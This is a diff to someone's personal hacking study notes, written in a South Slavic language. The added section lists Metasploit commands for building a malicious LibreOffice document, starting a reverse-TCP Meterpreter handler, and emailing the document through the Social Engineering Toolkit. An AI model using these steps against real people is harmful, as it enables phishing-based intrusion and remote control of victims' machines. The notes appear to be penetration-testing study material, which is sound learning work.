@@ -15,5 +15,20 @@ Tags: [[Hacking]]
 4. `exploit`
 	1. final step
 
+## Libre exploitation
+1. kreirati maliciozni libre
+	1.  `search name:libre`
+	2. `use ime`
+	3. `show options`
+		1. pogledati i payload opcije
+	4. `run` ce kreirati dokument
+	5. setupati payload
+		1. `use exploit/multi/handler`
+		2. `set payload python/meterpreter/reverse_tcp`
+		3. `run` slusati ce za dolazne konekcije
+	6. poslati dokument preko maila, koristiti cemo `social engineering toolkit`
+2. kreirati handle za konekciju
+
 ---
 # References
+- [msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
